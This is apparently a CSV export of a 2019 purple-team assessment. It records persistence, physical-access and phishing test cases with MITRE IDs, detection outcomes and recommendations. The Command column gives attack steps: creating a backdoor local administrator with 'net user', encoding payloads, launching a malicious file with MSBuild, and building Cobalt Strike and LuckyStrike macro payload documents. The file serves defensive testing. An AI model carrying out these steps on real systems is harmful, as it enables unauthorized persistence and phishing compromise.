AssessmentGroup,Campaign,Phase,Variant,MitreID,CapecId,Method,Status,Outcome,Alert Severity,Alert Triggered,Activity Logged,Outcome Notes,Detection Recommendations,SourceIps,TargetAssets,ExpectedDetectionLayers,DetectingTools,Start Time,Start Time Epoch,Stop Time,Stop Time Epoch,Detection Time,Detection Time Epoch,Organizations,Tags,Objective,Command,References,Liklihood,Risk,Internal/External,Stealth,Attack Vector,Attack Complexity,Privileges Required,Attacker Tools
Enterprise Purple – 2019 Q1,Endpoint Persistence,Persistence,Use of sc.exe to create rogue service to maintain access,T1543.003,,Rogue Service Creation,Completed,Detected,High,TBD,No,,1) EDR and/or SIEM rules are configured to detect Windows service creation events,,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2019-01-13T21:46:43.197Z,1547416003197,2019-01-13T22:11:07.197Z,1547417467197,2019-01-28T22:16:14.512Z,1548713774512,Security Risk Advisors,,Modification of the registry startup keys to launch a rogue service.,,,Low,Medium,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Endpoint Persistence,Persistence,Use of WMI Subscription for persistent jobs,T1546.003,,Windows Management Instrumentation,Completed,Detected,High,TBD,No,,1) EDR and/or SIEM rules are configured to detect suspicious WMI execution,,,"SIEM,EDR,Endpoint Protection",DoDonpachi,2019-01-14T10:25:29.197Z,1547461529197,2019-01-14T11:18:05.197Z,1547464685197,2019-01-28T22:18:29.715Z,1548713909715,Security Risk Advisors,,Establish persistence using WMI event subscriptions.,"Create a one liner payload
cat payload.txt | iconv --to-code=UTF-16LE | base64 -w 0

Red team → Persistence → WMI Event Persistence using PowerShell",https://github.com/harleyQu1nn/AggressorScripts/tree/master/Persistence,Medium,Medium,Internal,Medium,,,,"Native Windows Commands,Cobalt Strike"
Enterprise Purple – 2019 Q1,Endpoint Persistence,Persistence,Create a Local Administrator User on Server,T1136,,Backdoor Accounts,Completed,Detected,High,TBD,Yes,,"1) EDR tool alerts on suspicious use of Windows 'net user' and similar commands,2) SIEM alerts on local and domain user and group creation and modifications",,,"SIEM,EDR",Progear,2019-01-14T08:16:50.197Z,1547453810197,2019-01-14T08:19:03.197Z,1547453943197,2019-01-28T22:17:08.140Z,1548713828140,Security Risk Advisors,,Create a Local administrator user after the compromise of a system.,"net user /add [username] [password]
new localgroup administrators [username] /add",,Medium,High,Internal,Low,,,,
Enterprise Purple – 2019 Q1,Endpoint Persistence,Persistence,Use of common Run keys to maintain persistence,T1547.001,,Registry Modification,Completed,Blocked,TBD,Yes,TBD,,1) EDR and/or SIEM rules are configured to detect Windows registry modifications,,,"SIEM,EDR,Endpoint Protection",Ketsui,2019-01-14T00:28:24.197Z,1547425704197,2019-01-14T00:34:18.197Z,1547426058197,2019-01-14T01:50:38.197Z,1547430638197,Security Risk Advisors,,"Run a payload during user login and startup, attempt to connect back to C2 server over TCP or UDP channels.",,,Medium,High,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Physical Access,Exploitation,Laptop or workstation boot attack,T1091,,Workstation Local Attack,Completed,Blocked,TBD,No,TBD,,,,,Secure Baselines,Secure Configs,2019-01-15T01:06:11.197Z,1547514371197,2019-01-15T01:53:09.197Z,1547517189197,2019-01-15T03:23:43.197Z,1547522623197,Security Risk Advisors,,Attempt cold boot on laptops with missing or partial FDE,Load kali on boot-able usb,,Low,High,Both,Medium,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Physical Access,Exploitation,Locked workstation attack,T1200,,Workstation Local Attack,Completed,NotDetected,TBD,TBD,No,,1) Payload run from bashbunny device is detected by EDR and/or SIEM rules,,,"SIEM,EDR,Secure Baselines",,2019-01-14T14:03:57.197Z,1547474637197,2019-01-14T14:45:58.197Z,1547477158197,2019-01-14T15:26:59.197Z,1547479619197,Security Risk Advisors,,"Setup rogue DHCP server and connect to laptop in locked state, intercept credentials using Responder tool.",Use bashbunny with responder loaded,,Low,High,Both,Medium,,,,"Responder,Manual Techniques"
Enterprise Purple – 2019 Q1,Physical Access,Exploitation,USB Rubby Ducky,T1091,,Workstation Local Attack,Completed,Blocked,TBD,Yes,No,,1) Payload from rubber ducky is detected by EDR and/or SIEM rules,,,"SIEM,EDR,Secure Baselines",Ketsui,2019-01-14T21:03:58.197Z,1547499838197,2019-01-14T22:56:44.197Z,1547506604197,2019-01-28T22:20:58.185Z,1548714058185,Security Risk Advisors,,Attack local laptop/workstation using USB device to execute malicious code.,cmd /c \\<share>\<folder>\file.bat,,Medium,High,Internal,High,,,,"Native Windows Commands,Cobalt Strike"
Enterprise Purple – 2019 Q1,Physical Access,Exploitation,Mouse Jacking,T1200,,Wireless Attack,Completed,Detected,Med,TBD,No,,1) Established C2 payload from mouse jacker payload is detected by EDR tool and/or SIEM events.,,,"SIEM,EDR,Secure Baselines",DoDonpachi,2019-01-14T17:17:31.197Z,1547486251197,2019-01-14T18:27:37.197Z,1547490457197,2019-01-28T22:20:27.808Z,1548714027808,Security Risk Advisors,,Attack local laptop via preexisting vulnerable USB mouse dongle.,jackit --script <Ducky_Script>,,Low,High,Internal,Medium,,,,"Native Windows Commands,Cobalt Strike,JackIt"
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,10 - Macro - MSBuild,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-06T08:59:12.197Z,1546765152197,2019-01-06T09:03:29.197Z,1546765409197,2019-01-28T21:54:19.052Z,1548712459052,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe <MALICIOUS_FILE>,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,16 - Archive - DDE,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,No,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-05T11:22:39.197Z,1546687359197,2019-01-05T11:35:24.197Z,1546688124197,2019-01-28T21:55:52.143Z,1548712552143,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip the dde office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,3 - Macro - Cobalt Strike Standard as HREF (URL Rewrite Update),T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-05T23:46:55.197Z,1546732015197,2019-01-06T01:24:17.197Z,1546737857197,2019-01-06T02:04:15.197Z,1546740255197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,8 - Macro - MMG WMI PowerShell,T1566.001,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-06T15:18:22.197Z,1546787902197,2019-01-06T17:11:53.197Z,1546794713197,2019-01-06T17:15:49.197Z,1546794949197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,15 - Archive - Macro,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-07T05:45:26.197Z,1546839926197,2019-01-07T07:28:06.197Z,1546846086197,2019-01-07T08:22:31.197Z,1546849351197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip or rar malicious document and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,14 - Macro - Remote Template,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2019-01-05T07:37:28.197Z,1546673848197,2019-01-05T07:59:06.197Z,1546675146197,2019-01-05T09:56:03.197Z,1546682163197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Create a Word document, add the macro, then save as a .dotm 

Host the template

Create a new document and link the hosted template to it 
(Developer -> Document Template -> Document Template Url)",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,12 - Macro - MMG WMI Exe,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-06T22:54:57.197Z,1546815297197,2019-01-07T00:44:04.197Z,1546821844197,2019-01-07T01:42:00.197Z,1546825320197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,20 - Password-protected Office Doc - Standard CS payload,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2019-01-05T19:21:50.197Z,1546716110197,2019-01-05T19:27:40.197Z,1546716460197,2019-01-05T20:12:17.197Z,1546719137197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Generate standard office payload using cobalt strike from Attacks -> Packages -> MS Office Macro

When saving the malicious macro, encrypt the document with a password by: Save -> Info -> Protect Document -> Encrypt With Password",,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,17 - Macro - LuckyStrike PowerShell CellEmbed + Sandbox Evasion,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-07T09:09:35.197Z,1546852175197,2019-01-07T10:31:46.197Z,1546857106197,2019-01-28T21:56:06.744Z,1548712566744,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,5 - Macro - WScript PowerShell,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-06T06:55:04.197Z,1546757704197,2019-01-06T07:16:06.197Z,1546758966197,2019-01-06T08:43:54.197Z,1546764234197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,9 - Macro - LuckyStrike PowerShell CellEmbed,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-06T18:57:38.197Z,1546801058197,2019-01-06T20:45:14.197Z,1546807514197,2019-01-28T21:54:08.092Z,1548712448092,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,21 - Link Inside PDF,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2019-01-05T21:00:01.197Z,1546722001197,2019-01-05T21:02:06.197Z,1546722126197,2019-01-05T21:03:05.197Z,1546722185197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Create a PDF with a malicious link in it and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,19 - Encrypted Archive - DDE,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2019-01-05T16:34:00.197Z,1546706040197,2019-01-05T17:55:14.197Z,1546710914197,2019-01-05T19:08:02.197Z,1546715282197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip and encrypt the dde office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,4 - Macro - Cobalt Strike Standard (URL Rewrite Update),T1566.001,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-06T03:47:01.197Z,1546746421197,2019-01-06T04:28:31.197Z,1546748911197,2019-01-06T06:53:01.197Z,1546757581197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,1 - Macro - Cobalt Strike Standard,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-04T23:01:12.197Z,1546642872197,2019-01-04T23:56:37.197Z,1546646197197,2019-01-05T00:23:00.197Z,1546647780197,Security Risk Advisors,,Send phishing email to victim containing link with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Attacks --> Packages --> MS Office Macro
Copy code to office document",,Low,Low,External,Low,,,,Cobalt Strike
